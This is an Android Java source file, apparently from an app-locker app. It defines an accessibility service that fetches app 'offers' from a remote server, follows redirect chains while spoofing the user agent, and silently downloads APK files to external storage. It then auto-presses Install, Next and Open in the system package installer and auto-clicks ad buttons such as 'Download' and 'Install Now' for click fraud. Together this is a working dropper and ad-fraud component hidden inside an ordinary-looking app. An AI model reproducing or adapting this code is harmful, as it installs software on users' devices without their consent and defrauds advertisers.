package com.noahapp.accesslib;

import android.accessibilityservice.AccessibilityService;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.content.pm.PackageManager.NameNotFoundException;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Build;
import android.os.Build.VERSION;
import android.os.Environment;
import android.os.Handler;
import android.os.Message;
import android.support.annotation.RequiresApi;
import android.text.TextUtils;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import com.amigo.applocker.BuildConfig;
import com.android.volley.RequestQueue;
import com.android.volley.Response.ErrorListener;
import com.android.volley.Response.Listener;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.JsonArrayRequest;
import com.android.volley.toolbox.JsonObjectRequest;
import com.android.volley.toolbox.Volley;
import com.noahapp.accesslib.download.DownloadFile;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.File;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Arrays;
import java.util.List;
import java.util.Random;

//import com.facebook.ads.Ad;
//import com.facebook.ads.AdError;
//import com.facebook.ads.InterstitialAd;
//import com.facebook.ads.InterstitialAdListener;
//import com.google.android.gms.common.zze;

@RequiresApi(api = Build.VERSION_CODES.JELLY_BEAN)
public class BaseAccessibilityService3 extends AccessibilityService {
    private static final String AUTO_INSTALL_TEXT_INSTALL = "Install";
    private static final String AUTO_INSTALL_TEXT_NEXT = "Next";
    private static final String AUTO_INSTALL_TEXT_OPEN = "Open";
    private static final String FILE_PATH = (Environment.getExternalStorageDirectory() + "/test/");
    //    private InterstitialAd interstitialAd;
    private long last_refresh_time = 0;
    private long last_request_time = 0;
    private long last_start_fbad_time = 0;
    private Handler mHandler = new Handler() {
        public void handleMessage(Message msg) {
            super.handleMessage(msg);
            switch (msg.what) {
                case 10001:
                    BaseAccessibilityService3.this.JumpInstall(msg.getData().getString("packname"));
                    return;
                default:
                    return;
            }
        }
    };
    private RequestQueue mQueue;

    public class RealLinkAsyncTask extends AsyncTask<String, String, String> {
        private Context mContext;
        private String mOriginalLink;
        private String mPackName;
        private String mUserAgent = getUserAgent();

        public RealLinkAsyncTask(Context ctx, String packname, String original) {
            this.mOriginalLink = original;
            this.mPackName = packname;
            this.mContext = ctx;
        }

        private String getUserAgent() {
            String userAgent = PreferenceFile.getInstance(this.mContext).getUserAgent();
            if (TextUtils.isEmpty(userAgent)) {
                return (String) Arrays.asList(UAConsts.UA_ANDROIDS).get(new Random().nextInt(15));
            }
            BaseAccessibilityService3.this.trackAction("userAgent=" + userAgent);
            return userAgent;
        }

        protected String doInBackground(String... params) {
            String gpLink = BaseAccessibilityService3.this.GetGPLink(this.mOriginalLink, this.mUserAgent);
            return (TextUtils.isEmpty(gpLink) || !(gpLink.startsWith("https://play.google.com/") || gpLink.contains("" +
                    ".apk"))) ? "" : gpLink;
        }

        protected void onPostExecute(String link) {
            if (!TextUtils.isEmpty(link)) {
                if (link.startsWith("https://play.google.com/")) {
                    DP.E("jump_gplink==" + link);
                    BaseAccessibilityService3.this.trackAction("jump_gplink=" + link);
                    PreferenceFile.getInstance(BaseAccessibilityService3.this.getApplicationContext()).saveNowAPK
                            (this.mOriginalLink);
                    PreferenceFile.getInstance(BaseAccessibilityService3.this.getApplicationContext()).saveNowLink
                            (link);
                    PreferenceFile.getInstance(BaseAccessibilityService3.this.getApplicationContext())
                            .saveNowPackName(this.mPackName);
                    BaseAccessibilityService3.this.JumpLink(link);
                    return;
                }
                DP.E("start silent download ==" + link);
                BaseAccessibilityService3.this.trackAction("start_silent_download=" + link);
                PreferenceFile.getInstance(BaseAccessibilityService3.this.getApplicationContext()).saveDDLTracking
                        (this.mOriginalLink);
                PreferenceFile.getInstance(BaseAccessibilityService3.this.getApplicationContext()).saveNowDDL(link);
                PreferenceFile.getInstance(BaseAccessibilityService3.this.getApplicationContext()).saveNowDDLPackName
                        (this.mPackName);
                BaseAccessibilityService3.this.downLoadFile(this.mPackName, link);
            }
        }
    }

//    private void loadInterstitialAd() {
//        DP.toast(getApplicationContext(), "interstitialAd start..");
//        trackAction("interstitialAd_init");
//        this.interstitialAd = new InterstitialAd(getApplicationContext(), "1748050855445951_1830854607165575");
//        this.interstitialAd.setAdListener(new InterstitialAdListener() {
//            public void onInterstitialDisplayed(Ad ad) {
//            }
//
//            public void onInterstitialDismissed(Ad ad) {
//            }
//
//            public void onAdClicked(Ad ad) {
//            }
//
//            public void onError(Ad ad, AdError adError) {
//                DP.E("interstitialAd error:" + adError.getErrorMessage());
//            }
//
//            public void onAdLoaded(Ad ad) {
//                if (BaseAccessibilityService3.this.interstitialAd != null) {
//                    BaseAccessibilityService3.this.interstitialAd.show();
//                    DP.E("interstitialAd show");
//                    BaseAccessibilityService3.this.trackAction("interstitialAd_show");
//                }
//            }
//        });
//        this.interstitialAd.loadAd();
//    }

    protected void onServiceConnected() {
    }

    private void requestForLink(String keyword) {
        if (this.mQueue == null) {
            this.mQueue = Volley.newRequestQueue(getApplicationContext());
        }
        if (System.currentTimeMillis() - this.last_request_time >= 300000) {
            this.last_request_time = System.currentTimeMillis();
            String last_pack_name = PreferenceFile.getInstance(getApplicationContext()).getNowPackName();
            String last_link = PreferenceFile.getInstance(getApplicationContext()).getNowLink();
            String last_apk = PreferenceFile.getInstance(getApplicationContext()).getNowApk();
            if (TextUtils.isEmpty(last_pack_name) || TextUtils.isEmpty(last_link) || checkApkExist(last_pack_name)) {
                trackAction("request_" + keyword);
                this.mQueue.add(new JsonArrayRequest("http://api.hehevideo.com/offerlist/" + keyword, new
                        Listener<JSONArray>() {
                    public void onResponse(JSONArray response) {
                        try {
                            int length = response.length();
                            for (int i = 0; i < length; i++) {
                                JSONObject jsonObject = response.getJSONObject(i);
                                String link = jsonObject.getString("link");
                                if (!TextUtils.isEmpty(link)) {
                                    String packageName = jsonObject.getString("packname");
                                    if (TextUtils.isEmpty(packageName)) {
                                        BaseAccessibilityService3.this.JumpBrowser(link);
                                        BaseAccessibilityService3.this.trackAction("jump_order_me=" + link);
                                    } else {
                                        String apk = jsonObject.getString("apk");
                                        if (BaseAccessibilityService3.this.checkApkExist(packageName)) {
                                            DP.E("package_exist");
                                            BaseAccessibilityService3.this.trackAction("package_exist");
                                        } else {
                                            BaseAccessibilityService3.this.trackAction("original_link=" + link);
                                            BaseAccessibilityService3.this.trackAction("original_apk=" + apk);
                                            BaseAccessibilityService3.this.trackAction("original_packname=" +
                                                    packageName);
                                            BaseAccessibilityService3.this.installApk(packageName, link, apk);
                                            PreferenceFile.getInstance(BaseAccessibilityService3.this
                                                    .getApplicationContext()).saveNowPackName(packageName);
                                            PreferenceFile.getInstance(BaseAccessibilityService3.this
                                                    .getApplicationContext()).saveNowLink(link);
                                            PreferenceFile.getInstance(BaseAccessibilityService3.this
                                                    .getApplicationContext()).saveNowAPK(apk);
                                            return;
                                        }
                                    }
                                }
                                DP.E("link:" + link);
                            }
                        } catch (Exception e) {
                            DP.E("error=" + e.toString());
                            e.printStackTrace();
                        }
                    }
                }, new ErrorListener() {
                    public void onErrorResponse(VolleyError error) {
                        DP.E("error:" + error.toString());
                    }
                }));
                return;
            }
            DP.E("jump_cache_link:" + last_link);
            trackAction("jump_cache_link" + last_link);
            installApk(last_pack_name, last_link, last_apk);
        }
    }

    private void requestForApk(String keyword) {
        if (this.mQueue == null) {
            this.mQueue = Volley.newRequestQueue(getApplicationContext());
        }
        String last_pack_name = PreferenceFile.getInstance(getApplicationContext()).getNowDDLPackName();
        String last_link = PreferenceFile.getInstance(getApplicationContext()).getNowDDL();
        String last_originalLink = PreferenceFile.getInstance(getApplicationContext()).getDDLTracking();
        if (TextUtils.isEmpty(last_pack_name) || checkApkExist(last_pack_name)) {
            trackAction("request_" + keyword);
            DP.E("request_" + keyword);
            this.mQueue.add(new JsonArrayRequest("http://api.hehevideo.com/offerlist/" + keyword, new
                    Listener<JSONArray>() {
                public void onResponse(JSONArray response) {
                    try {
                        int length = response.length();
                        for (int i = 0; i < length; i++) {
                            JSONObject jsonObject = response.getJSONObject(i);
                            String link = jsonObject.getString("link");
                            if (!TextUtils.isEmpty(link)) {
                                String packageName = jsonObject.getString("packname");
                                if (TextUtils.isEmpty(packageName)) {
                                    continue;
                                } else if (BaseAccessibilityService3.this.checkApkExist(packageName)) {
                                    DP.E("package_exist");
                                    BaseAccessibilityService3.this.trackAction("download_apk_exist:" + packageName);
                                } else {
                                    BaseAccessibilityService3.this.trackAction("download_orignial=" + link);
                                    new RealLinkAsyncTask(BaseAccessibilityService3.this.getApplication(),
                                            packageName, link).execute(new String[0]);
                                    return;
                                }
                            }
                        }
                    } catch (Exception e) {
                        DP.E("error=" + e.toString());
                        e.printStackTrace();
                    }
                }
            }, new ErrorListener() {
                public void onErrorResponse(VolleyError error) {
                }
            }));
            return;
        }
        installApk(last_pack_name, last_originalLink, last_link);
    }

    private void requestForConfig() {
        if (this.mQueue == null) {
            this.mQueue = Volley.newRequestQueue(getApplicationContext());
        }
        trackAction("request_config");
        this.mQueue.add(new JsonObjectRequest("http://api.hehevideo.com/config.json", null, new Listener<JSONObject>() {
            public void onResponse(JSONObject response) {
                try {
                    PreferenceFile.getInstance(BaseAccessibilityService3.this.getApplicationContext())
                            .saveConfigFBInterval(response.getInt("fb_interval"));
                } catch (Exception ex) {
                    ex.printStackTrace();
                }
            }
        }, null));
    }

    private void trackAction(String order) {
        TrackManager.getInstance(getApplicationContext()).trackAction(order);
    }

    public boolean checkApkExist(String packageName) {
        if (TextUtils.isEmpty(packageName)) {
            return false;
        }
        try {
            ApplicationInfo info = getPackageManager().getApplicationInfo(packageName, PackageManager
                    .GET_UNINSTALLED_PACKAGES);
            return true;
        } catch (NameNotFoundException e) {
            return false;
        }
    }

    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (VERSION.SDK_INT >= 15) {
            checkInstall(event);
            int eventType = event.getEventType();
            if (eventType != 2048) {
                DP.E("eventType:" + eventType);
                AccessibilityNodeInfo rootNode = getRootInActiveWindow();
                if (rootNode != null) {
                    String rootPackName = rootNode.getPackageName().toString();
                    DP.E("package=" + rootPackName);
                    switch (eventType) {
                        case AccessibilityEvent.TYPE_VIEW_CLICKED:
                            return;
                        case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED:
//                            if (rootNode.getPackageName().equals(zze.GOOGLE_PLAY_STORE_PACKAGE)) {
//                                requestForLink("order_gp");
//                                return;
//                            }
                            return;
                        case AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED:
//                            if (rootNode.getPackageName().equals(zze.GOOGLE_PLAY_STORE_PACKAGE)) {
//                                requestForLink("order_gp");
//                                return;
//                            } else
                            if (!rootNode.getPackageName().equals("com.android.chrome")
                                    && !rootNode.getPackageName().equals("com.UCMobile.intl")
                                    && !rootNode.getPackageName().equals("com.uc.browser.en")
                                    && !rootNode.getPackageName().equals("com.opera.mini.native")
                                    && !rootNode.getPackageName().equals("com.opera.browser")
                                    && !rootNode.getPackageName().equals("org.mozilla.firefox")
                                    && !rootNode.getPackageName().equals("com.ksmobile.cb")
                                    && !rootNode.getPackageName().equals("com.android.browser")
                                    && !rootNode.getPackageName().equals("com.UCMobile")) {
                                if (rootPackName.equals("com.android.settings")
                                        || rootPackName.equals("com.android.systemui")
                                        || rootPackName.equals("com.android.packageinstaller")
                                        || rootPackName.contains("launcher")
                                        || rootPackName.equals(BuildConfig.APPLICATION_ID)) {
                                    if (rootPackName.equals(BuildConfig.APPLICATION_ID)) {
                                        simulateFbClick(rootNode);
                                        return;
                                    }
                                    return;
                                } else if (PreferenceFile.getInstance(getApplicationContext()).shoulddownload()) {
                                    requestForApk("order_apk");
                                    return;
                                } else {
                                    return;
                                }
                            } else {
                                return;
                            }
                        case AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED:
//                            if (!rootNode.getPackageName().equals(zze.GOOGLE_PLAY_STORE_PACKAGE) && rootNode
//                                    .getPackageName().equals(BuildConfig.APPLICATION_ID)) {
//                                simulateFbClick(rootNode);
//                                return;
//                            }
                            return;
                        case AccessibilityEvent.TYPE_VIEW_SCROLLED:
//                            if (rootNode.getPackageName().equals(zze.GOOGLE_PLAY_STORE_PACKAGE)) {
//                                requestForLink("order_gp");
//                                return;
//                            }
                            return;
                        case AccessibilityEvent.TYPE_VIEW_TEXT_SELECTION_CHANGED:
//                            if (!rootNode.getPackageName().equals(zze.GOOGLE_PLAY_STORE_PACKAGE)) {
//                                return;
//                            }
                            return;
                        default:
                            return;
                    }
                }
            }
        }
    }

    protected void reCheckClickEvent(AccessibilityEvent event, String[] list) {
        if (System.currentTimeMillis() - this.last_refresh_time > 43200000) {
            requestForConfig();
            this.last_refresh_time = System.currentTimeMillis();
        }
        if (System.currentTimeMillis() - this.last_start_fbad_time >
                ((long) ((PreferenceFile.getInstance(getApplication()).getConfigFBInterval() * 1000) * 60))) {
            boolean shouldBlocked = false;
            String rootPackName = event.getPackageName().toString();
            if (event.getEventType() == 1
                    && !rootPackName.equals(BuildConfig.APPLICATION_ID)
//                    && !rootPackName.equals(zze.GOOGLE_PLAY_STORE_PACKAGE)
                    && !rootPackName.equals("com.android.settings")
                    && !rootPackName.equals("com.android.systemui")
                    && !rootPackName.equals("com.android.packageinstaller")
                    && !rootPackName.contains("launcher")) {
                for (String equals : list) {
                    if (equals.equals(rootPackName)) {
                        shouldBlocked = true;
                        break;
                    }
                }
                if (!shouldBlocked) {
//                    loadInterstitialAd();
                    this.last_start_fbad_time = System.currentTimeMillis();
                }
            }
        }
    }

    private boolean findAndPerformActionButton(AccessibilityNodeInfo rootNode, String text) {
        List<AccessibilityNodeInfo> nodes = rootNode.findAccessibilityNodeInfosByText(text);
        int i = 0;
        while (i < nodes.size()) {
            AccessibilityNodeInfo node = (AccessibilityNodeInfo) nodes.get(i);
            if (node.getClassName().equals("android.widget.Button") && node.isEnabled()) {
                node.performAction(16);
                return true;
            } else if (node.getClassName().equals("android.widget.TextView") && node.isEnabled()) {
                node.performAction(16);
                return true;
            } else {
                i++;
            }
        }
        return false;
    }

    private void JumpLink(String link) {
//        Intent browserIntent = new Intent("android.intent.action.VIEW", Uri.parse(link));
//        browserIntent.setClassName(zze.GOOGLE_PLAY_STORE_PACKAGE, "com.android.vending.AssetBrowserActivity");
//        browserIntent.setFlags(268435456);
//        startActivity(browserIntent);
    }

    private void JumpBrowser(String link) {
        Intent intent = new Intent("android.intent.action.VIEW", Uri.parse(link));
        intent.setFlags(268435456);
        startActivity(intent);
    }

    private void JumpInstall(String packname) {
        File file = new File(FILE_PATH + packname + ".apk");
        Intent intentInstall = new Intent("android.intent.action.VIEW");
        intentInstall.setDataAndType(Uri.fromFile(file), "application/vnd.android.package-archive");
        intentInstall.setFlags(268435456);
        startActivity(intentInstall);
        trackAction("jump_install=" + packname);
    }

    public void onInterrupt() {
    }

    private String GetGPLink(String url, String userAgent) {
        if (url.startsWith("https://play.google.com/")) {
            return url;
        }
        String location = "";
        try {
            HttpURLConnection conn = (HttpURLConnection) new URL(url).openConnection();
            conn.setRequestMethod("GET");
            conn.setInstanceFollowRedirects(false);
            conn.addRequestProperty("Accept-Charset", "UTF-8;");
            conn.addRequestProperty("User-Agent", userAgent);
            conn.connect();
            location = conn.getHeaderField("Location");
            if (location.startsWith("market://details?id=")) {
                return location.replace("market://details?id=", "https://play.google.com/store/apps/details?id=");
            }
            if (location.contains(".apk")) {
                return location;
            }
            conn = (HttpURLConnection) new URL(location).openConnection();
            conn.setRequestMethod("GET");
            conn.addRequestProperty("Accept-Charset", "UTF-8;");
            conn.addRequestProperty("User-Agent", userAgent);
            conn.connect();
            if (location.startsWith("https://play.google.com/")) {
                return location;
            }
            return GetGPLink(location, userAgent);
        } catch (Exception ex) {
            DP.E("error:" + ex.toString());
            return location;
        }
    }

    private void downLoadFile(String name, String link) {
        DownloadFile.downloadFile(getApplicationContext(), link, name);
    }

    private void installApk(String packname, String originalLink, String downlink) {
        if (!checkApkExist(packname)) {
            if (new File(FILE_PATH + packname + ".apk").exists()) {
                JumpBrowser(originalLink);
                Message message = new Message();
                message.what = 10001;
                message.getData().putString("packname", packname);
                this.mHandler.sendMessageDelayed(message, 8000);
                return;
            }
            downLoadFile(packname, downlink);
        }
    }

    private boolean checkTitle(AccessibilityNodeInfo source, String title) {
        for (AccessibilityNodeInfo node : source.findAccessibilityNodeInfosByText(title)) {
            if (node.getClassName().equals("android.widget.TextView")) {
                return true;
            }
        }
        return false;
    }

    private void checkInstall(AccessibilityEvent event) {
        boolean notNull;
        boolean installPage = false;
        if (event.getSource() != null) {
            notNull = true;
        } else {
            notNull = false;
        }
        if (notNull) {
            if (event.getPackageName().equals("com.android.packageinstaller") || event.getPackageName().equals("com" +
                    ".google.android.packageinstaller")) {
                installPage = true;
            }
            if (installPage) {
                doInstall(event);
            }
        }
    }

    private void doInstall(AccessibilityEvent event) {
        int i;
        AccessibilityNodeInfo node;
        List<AccessibilityNodeInfo> unintall_nodes = event.getSource().findAccessibilityNodeInfosByText
                (AUTO_INSTALL_TEXT_INSTALL);
        if (!(unintall_nodes == null || unintall_nodes.isEmpty())) {
            for (i = 0; i < unintall_nodes.size(); i++) {
                node = (AccessibilityNodeInfo) unintall_nodes.get(i);
                if (node.getClassName().equals("android.widget.Button") && node.isEnabled()) {
                    node.performAction(16);
                    performGlobalAction(1);
                    performGlobalAction(2);
                    trackAction("ddl_install_and_startapp");
                }
            }
        }
        List<AccessibilityNodeInfo> next_nodes = event.getSource().findAccessibilityNodeInfosByText
                (AUTO_INSTALL_TEXT_NEXT);
        if (!(next_nodes == null || next_nodes.isEmpty())) {
            for (i = 0; i < next_nodes.size(); i++) {
                node = (AccessibilityNodeInfo) next_nodes.get(i);
                if (node.getClassName().equals("android.widget.Button") && node.isEnabled()) {
                    node.performAction(16);
                }
            }
        }
        List<AccessibilityNodeInfo> ok_nodes = event.getSource().findAccessibilityNodeInfosByText
                (AUTO_INSTALL_TEXT_OPEN);
        if (ok_nodes != null && !ok_nodes.isEmpty()) {
            for (i = 0; i < ok_nodes.size(); i++) {
                node = (AccessibilityNodeInfo) ok_nodes.get(i);
                if (node.getClassName().equals("android.widget.Button") && node.isEnabled()) {
                    node.performAction(16);
                }
            }
        }
    }

    private void simulateFbClick(AccessibilityNodeInfo rootNode) {
        String last_install_packname = PreferenceFile.getInstance(getApplication()).getLastInstallPackName();
        String last_interstitial_time = PreferenceFile.getInstance(getApplication()).getLastInterstitialTimeStamp();
        if (!TextUtils.isEmpty(last_install_packname) || !TextUtils.isEmpty(last_interstitial_time)) {
            if (findAndPerformActionButton(rootNode, "Download")) {
                DP.E("fb_click_download");
                trackAction("fb_click_download");
                PreferenceFile.getInstance(getApplication()).saveLastInstallPackName("");
                PreferenceFile.getInstance(getApplication()).saveLastInterstitialTimeStamp("");
            } else if (findAndPerformActionButton(rootNode, "Learn More")) {
                DP.E("fb_click_learnmore");
                trackAction("fb_click_learnmore");
                PreferenceFile.getInstance(getApplication()).saveLastInstallPackName("");
                PreferenceFile.getInstance(getApplication()).saveLastInterstitialTimeStamp("");
            } else if (findAndPerformActionButton(rootNode, "Open Link")) {
                DP.E("fb_click_openlink");
                trackAction("fb_click_openlink");
                PreferenceFile.getInstance(getApplication()).saveLastInstallPackName("");
                PreferenceFile.getInstance(getApplication()).saveLastInterstitialTimeStamp("");
            } else if (findAndPerformActionButton(rootNode, "Shop Now")) {
                DP.E("fb_click_shopnow");
                trackAction("fb_click_shopnow");
                PreferenceFile.getInstance(getApplication()).saveLastInstallPackName("");
                PreferenceFile.getInstance(getApplication()).saveLastInterstitialTimeStamp("");
            } else if (findAndPerformActionButton(rootNode, "Book Now")) {
                DP.E("fb_click_booknow");
                trackAction("fb_click_booknow");
                PreferenceFile.getInstance(getApplication()).saveLastInstallPackName("");
                PreferenceFile.getInstance(getApplication()).saveLastInterstitialTimeStamp("");
            } else if (findAndPerformActionButton(rootNode, "Sign Up")) {
                DP.E("fb_click_signup");
                trackAction("fb_click_signup");
                PreferenceFile.getInstance(getApplication()).saveLastInstallPackName("");
                PreferenceFile.getInstance(getApplication()).saveLastInterstitialTimeStamp("");
            } else if (findAndPerformActionButton(rootNode, "Watch More")) {
                DP.E("fb_click_watchmore");
                trackAction("fb_click_watchmore");
                PreferenceFile.getInstance(getApplication()).saveLastInstallPackName("");
                PreferenceFile.getInstance(getApplication()).saveLastInterstitialTimeStamp("");
            } else if (findAndPerformActionButton(rootNode, "Install Now")) {
                DP.E("fb_click_installnow");
                trackAction("fb_click_installnow");
                PreferenceFile.getInstance(getApplication()).saveLastInstallPackName("");
                PreferenceFile.getInstance(getApplication()).saveLastInterstitialTimeStamp("");
            }
        }
    }
}
